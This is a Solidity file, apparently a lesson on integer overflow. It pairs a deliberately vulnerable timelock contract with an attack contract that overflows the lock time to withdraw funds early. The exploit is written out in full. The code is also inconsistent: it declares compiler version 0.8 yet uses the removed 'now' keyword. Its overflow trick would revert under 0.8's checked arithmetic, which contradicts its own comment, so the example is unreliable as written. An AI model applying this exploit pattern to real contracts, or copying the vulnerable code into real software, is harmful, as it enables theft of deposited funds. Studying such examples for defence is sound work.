//SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;

/*
    Overflow / Underflow
*/

/*
    Preventative Techniques

    1. Use SafeMath to will prevent arithmetic overflow and underflow

    2. Solidity 0.8 defaults to throwing an error for overflow / underflow
*/

contract Timelock {

    mapping(address => uint) public balances;
    mapping(address => uint) public lockTime;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
        lockTime[msg.sender] = now + 1 weeks;
    }

    function increaseLockTime(uint _secondToIncrease) public {
        lockTime[msg.sender] += _secondToIncrease;
    }

    function withdraw() public {
        require(balances[msg.sender] > 0, "Insufficient funds");
        require(now > lockTime[msg.sender], "Lock time not expired");

        uint amount = balances[msg.sender];
        balances[msg.sender] = 0;

        (bool sent, ) = msg.sender.call{value:amount}("");
        require(sent, "Failed to send Ether");
    }
}

contract Attack {

    Timelock timeLock;

    constructor(Timelock _timeLock) {
        timeLock = Timelock(_timeLock);
    }

    fallback() external payable {}

    function attack() public payable {
        timeLock.deposit{value: msg.value}();
        /*
        if t = current lock time then we need to find x such that
        x + t = 2**256 = 0
        so x = -t
        2**256 = type(uint).max + 1
        so x = type(uint).max + 1 - t
        */
        timeLock.increaseLockTime(
            type(uint).max + 1 - timeLock.lockTime(address(this))
        );
        timeLock.withdraw();
    }
}
